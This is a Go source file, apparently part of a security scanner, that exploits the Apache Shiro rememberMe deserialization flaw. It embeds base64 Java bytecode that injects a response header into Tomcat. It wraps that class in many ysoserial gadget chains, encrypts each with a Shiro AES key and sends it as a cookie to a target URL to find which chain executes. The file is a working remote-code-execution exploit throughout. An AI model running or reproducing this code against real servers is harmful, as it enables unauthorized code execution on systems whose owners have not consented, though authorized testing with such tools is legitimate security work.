package shiro

import (
    "github.com/thoas/go-funk"
    "github.com/yaklang/yaklang/common/yak/yaklib/codec"
    "github.com/yaklang/yaklang/common/yso"
    "github.com/yhy0/Jie/pkg/protocols/httpx"
    "github.com/yhy0/Jie/pkg/util"
    "github.com/yhy0/logging"
    "strings"
)

/**
   @author yhy
   @since 2023/8/20
   @desc //TODO
**/

var gadgets map[string]func(options ...yso.GenClassOptionFun) (*yso.JavaObject, error)

func init() {
    gadgets = make(map[string]func(options ...yso.GenClassOptionFun) (*yso.JavaObject, error))
    gadgets["Click1"] = yso.GetClick1JavaObject
    gadgets["CB1"] = yso.GetCommonsBeanutils1JavaObject
    gadgets["CB183NoCC"] = yso.GetCommonsBeanutils183NOCCJavaObject
    gadgets["CB192NoCC"] = yso.GetCommonsBeanutils192NOCCJavaObject
    gadgets["CC2"] = yso.GetCommonsCollections2JavaObject
    gadgets["CC3"] = yso.GetCommonsCollections3JavaObject
    gadgets["CC4"] = yso.GetCommonsCollections4JavaObject
    gadgets["CC8"] = yso.GetCommonsCollections8JavaObject
    gadgets["CCK1"] = yso.GetCommonsCollectionsK1JavaObject
    gadgets["CCK2"] = yso.GetCommonsCollectionsK2JavaObject
    gadgets["JBI1"] = yso.GetJBossInterceptors1JavaObject
    gadgets["JSON1"] = yso.GetJSON1JavaObject
    gadgets["JW1"] = yso.GetJavassistWeld1JavaObject
    gadgets["Jdk7u21"] = yso.GetJdk7u21JavaObject
    gadgets["Jdk8u20"] = yso.GetJdk8u20JavaObject
}

func ScanGadget(u, cookieName, key string, mode string) string {
    bytesCode, err := codec.DecodeBase64("yv66vgAAADIAlQoAAgBEBwBFCgBGAEcHAEgKAEYASQoABABKCgBLAEwKAEsATQoAKQBOCgBPAFAKAE8AUQgAUgoAKABTBwBUCgBPAFUIAFYKAFcAWAgAWQgAWgcAWwgAXAgAXQgAXgcAXwgAYAcAYQsAGgBiCwAaAGMIAGQHAGUKAB4AZgcAZwoAIABoCgAgAGkJACgAaggAawoAVwBsCgBtAG4IAG8HAHAHAHEBAApFY2hvSGVhZGVyAQASTGphdmEvbGFuZy9TdHJpbmc7AQAFZ2V0RlYBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAA1TdGFja01hcFRhYmxlBwByBwBzBwBIAQAKRXhjZXB0aW9ucwEABjxpbml0PgEAAygpVgcAcAcAdAcARQcAdQcAXwcAYQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgcAdgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBAAdNTC5qYXZhDAB3AHgBABBqYXZhL2xhbmcvT2JqZWN0BwBzDAB5AHoBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MAHsAeAwANQB8BwByDAB9AH4MAH8AgAwANQA2BwB0DACBAIIMAIMAhAEAB3RocmVhZHMMACwALQEAE1tMamF2YS9sYW5nL1RocmVhZDsMAIUAhgEABGV4ZWMHAHUMAIcAiAEABGh0dHABAAZ0YXJnZXQBABJqYXZhL2xhbmcvUnVubmFibGUBAAZ0aGlzJDABAAdoYW5kbGVyAQAGZ2xvYmFsAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEACnByb2Nlc3NvcnMBAA5qYXZhL3V0aWwvTGlzdAwAiQCKDAB/AIsBAANyZXEBABlvcmcvYXBhY2hlL2NveW90ZS9SZXF1ZXN0DACMAIsBACVvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0DACNAIYMAI4AjwwAKgArAQACXHwMAJAAkQcAkgwAkwCUAQAPRXRhZ3wzMTQ3NTI2OTQ3AQACTUwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvVGhyZWFkAQAQamF2YS9sYW5nL1N0cmluZwEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1nZXRTdXBlcmNsYXNzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAEc2l6ZQEAAygpSQEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldE5vdGUBAA1nZXRSZXF1ZXN0VVJJAQALZ2V0UmVzcG9uc2UBACooKUxvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZTsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEAJm9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlAQAJc2V0SGVhZGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylWACEAKAApAAAAAQAJACoAKwAAAAUACgAsAC0AAgAuAAAAmwADAAUAAAA4AU0qtgABTi0SAqUAFi0rtgADTacADToELbYABU6n/+osxwAMuwAEWSu3AAa/LAS2AAcsKrYACLAAAQANABMAFgAEAAIALwAAADIADAAAAAsAAgAMAAcADQANAA8AEwAQABYAEQAYABIAHQATACAAFQAkABYALQAYADIAGQAwAAAAEQAE/QAHBwAxBwAyTgcAMwkMADQAAAAEAAEAGAABADUANgACAC4AAAIBAAMADgAAAQAqtwAJAz64AAq2AAsSDLgADcAADsAADjoEAzYFFQUZBL6iAN4ZBBUFMjoGGQbHAAanAMkZBrYAD00sEhC2ABGaALosEhK2ABGZALEZBhITuAANTCvBABSaAAanAJ8rEhW4AA0SFrgADRIXuAANTKcACDoHpwCGKxIZuAANwAAaOgcDNggVCBkHuQAbAQCiAGUZBxUIuQAcAgA6CRkJEh24AA1MK8AAHgS2AB/AACDAACA6ChkKtgAhxgA0GQq2ACI6C7IAIxIktgAlAzI6DLIAIxIktgAlBDI6DRkLGQwZDbYAJgQ+HZkABqcACYQIAaf/lR2ZAAanAAmEBQGn/yCxAAEAXQBuAHEAGAACAC8AAACKACIAAAAcAAQAHwAGACAAGQAhACQAIgArACMAMAAkADMAJgA5ACcASwAoAFMAKQBaACoAXQAuAG4AMQBxAC8AcwAwAHYAMwCBADQAkAA1AJsANgCjADcAswA4ALsAOQDCADoAzgA7ANoAPADjAD0A5QA/AOkAQADsADQA8gBEAPYARQD5ACEA/wBJADAAAABXAAr/ABwABgcANwAAAQcADgEAAPwAFgcAOP8AKQAHBwA3BwA5BwA6AQcADgEHADgAAFMHADsE/QANBwA8AfsAZ/oABf8ABgAGBwA3AAABBwAOAQAA+gAFADQAAAAEAAEAGAABAD0APgACAC4AAAAZAAAAAwAAAAGxAAAAAQAvAAAABgABAAAATAA0AAAABAABAD8AAQA9AEAAAgAuAAAAGQAAAAQAAAABsQAAAAEALwAAAAYAAQAAAE8ANAAAAAQAAQA/AAgAQQA2AAEALgAAAB4AAQAAAAAABhInswAjsQAAAAEALwAAAAYAAQAAAAgAAQBCAAAAAgBD")
    if err != nil {
        logging.Logger.Errorln(err)
        return ""
    }

    echoKey := util.RandomString(6)
    echoValue := util.RandomString(8)
    reqValue := echoKey + "|" + echoValue
    payloadObj, _ := yso.LoadClassFromBytes(bytesCode)

    flag := payloadObj.FindConstStringFromPool("Etag|3147526947")
    if flag != nil {
        flag.Value = reqValue
    }
    fixPayload, err := yso.ToBytes(payloadObj)
    if err != nil {
        logging.Logger.Errorln(err)
        return ""
    }
    keyDecoded, err := codec.DecodeBase64(key) // 生成key
    if err != nil {
        logging.Logger.Errorf("DecodeBase64 %v", err)
        return ""
    }

    var gadgetName = ""
    for gadget, genGadget := range gadgets {
        logging.Logger.Debugf("check gadget %v", gadget)
        className := util.RandomString(8)

        gadgetObj, err := genGadget(yso.SetBytesEvilClass(fixPayload), yso.SetObfuscation(), yso.SetClassName(className))
        if err != nil {
            logging.Logger.Errorln(err)
            continue
        }
        gadgetBytes, err := yso.ToBytes(gadgetObj)
        if err != nil {
            logging.Logger.Errorln(err)
            continue
        }
        payload := ""
        payloadPadding := codec.PKCS5Padding(gadgetBytes, 16)

        if mode == "GCM" {
            encodePayload, err := codec.AESGCMEncrypt(keyDecoded, payloadPadding, nil)
            if err != nil {
                continue
            }
            if encodePayload == nil {
                continue
            }
            payload = codec.EncodeBase64(append(encodePayload))
        } else {
            iv := []byte(util.RandomString(16))
            encodePayload, err := codec.AESCBCEncrypt(keyDecoded, payloadPadding, iv)
            if err != nil {
                continue
            }
            if encodePayload == nil {
                continue
            }
            payload = codec.EncodeBase64(append(iv, encodePayload...))
        }

        var header = make(map[string]string, 1)
        header["Cookie"] = cookieName + "=" + payload
        if res, err := httpx.Request(u, "GET", "", header); err == nil {
            respHeader := util.MapToJson(res.Header)
            if funk.Contains(strings.ToLower(respHeader), strings.ToLower(echoKey)) && funk.Contains(strings.ToLower(respHeader), strings.ToLower(echoValue)) {
                gadgetName += gadget + " | "
                logging.Logger.Infoln("[gadget] :", gadget)
            }
        }
    }
    return gadgetName
}
